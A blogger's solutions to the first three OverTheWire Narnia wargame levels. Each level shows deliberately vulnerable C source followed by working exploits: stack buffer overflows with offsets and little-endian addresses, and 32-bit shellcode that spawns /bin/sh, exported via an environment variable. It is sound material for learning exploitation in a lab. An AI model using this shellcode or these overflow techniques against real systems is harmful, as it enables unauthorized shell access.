These are my solutions to the narnia series of challenges from overthewire

Level 0 - 1
The goal of the first narnia challenge is a buffer overflow. Like all other challenges you are asked to ssh into the
challenge. Once inside if you run ./narnia0 you will find that you need to change a variable. This is similar to the
challenges at exploit exercises. The source code is this

#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef)
            system("/bin/sh");
    else {  
            printf("WAY OFF!!!!\n");
            exit(1);
    }

    return 0;
}

Again like the exploit exercises challenges the solution is a matter of injecting a certain amount of material
followed by deadbeef in proper endian format. There are a couple of ways of doing the solution but as I have been
using python in other challenges I will stick with it

(python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
or
AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde

The reason cat is used is to keep open the shell as without it the shell will close.



Level 1 - 2
This is the second challenge in the Narnia series and after ssh' ing into the challenge there is a file , the source
code fo the file which is gotten by running cat against the file is below -

#include <stdio.h>
 
int main(){
int (*ret)();
 
if(getenv("EGG")==NULL){
printf("Give me something to execute at the env-variable EGG\n");
exit(1);
}
 
printf("Trying to execute EGG!\n");
ret = getenv("EGG");
ret();
 
return 0;
}

As you can see it is a c file, it is asking for an environmental variable called egg inside the getenv() function.
Again this will require that we force material in order to redirect flow. There are as always a couple of ways
that will do the same thing -
This is working shellcode that will succeed in the challenge
export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'  
or using python as I have on other challenges
export EGG=$(python -c'print 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
There is also a fairly similar perl solution available but I am not that familiar with perl. There is also
a great tutorial on shellcode at
https://evilzone.org/tutorials/writing-shellcode-for-32-bit-linux-from-the-ground-up/



Level 2 - 3
In this the 3rd of the Narnia series of challenges there is once again a c file which must be exploited. The source
code for the file is this

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(int argc, char * argv[]){
char buf[128];
 
if(argc == 1){
printf("Usage: %s argument\n", argv[0]);
exit(1);
}
strcpy(buf,argv[1]);
printf("%s", buf);
 
return 0;
}

Once again from a first look the file looks as though there is going to be a buffer overflow vulnerability that
is present. Once again the usual methods of checking for various addresses is used like in previous examples or
in other challenge sets. Next up as per other examples if seeing how much code needs to be injected in order for
in this case the buf[] to be overwritten with shellcode that is shell-spawning. In this case there are 140 bytes
that are needed to overwrite the retrun address. The solution is below

python -c "print '\x41'*140 + '\xfd\xd8\xff\xff'"

The 140 characters and the shellcode address sent in with appropriate formating for endiannesss.
